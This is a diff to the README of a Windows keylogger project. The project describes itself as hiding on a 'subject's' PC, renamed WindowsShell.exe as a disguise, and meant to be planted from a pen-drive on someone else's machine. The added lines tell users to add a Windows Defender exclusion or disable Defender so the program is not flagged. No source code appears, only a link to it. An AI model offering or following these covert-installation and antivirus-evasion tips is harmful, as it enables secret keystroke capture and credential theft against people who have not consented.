@@ -13,6 +13,8 @@ This tacky program hides itself in the subject’s PC (Windows XP or later), and
  <div align="center">
    <img src="https://cloud.githubusercontent.com/assets/5456665/18231884/984f4d58-72e5-11e6-8401-725c6906c040.PNG" alt="StupidKeylogger"/>
  </div>
+ 
+ (NOTE : Windows Defender may detect this program as potential security threat at runtime, you can either [allow specific files](https://support.microsoft.com/en-us/help/4028485/windows-10-add-an-exclusion-to-windows-security) or disable windows defender(NOT RECOMMENDED) )
 
  **WindowsShell.exe** is the compiled and renamed form of [**Keylogger.cpp**](https://github.com/MinhasKamal/StupidKeylogger/blob/master/com/minhaskamal/stupidKeylogger/Keylogger.cpp). Of course you do not expect others to let you insert a pen-drive containing keylogger; even if that is stupid! **WindowsShell** is the link file of **WindowsShell.exe**. 
 
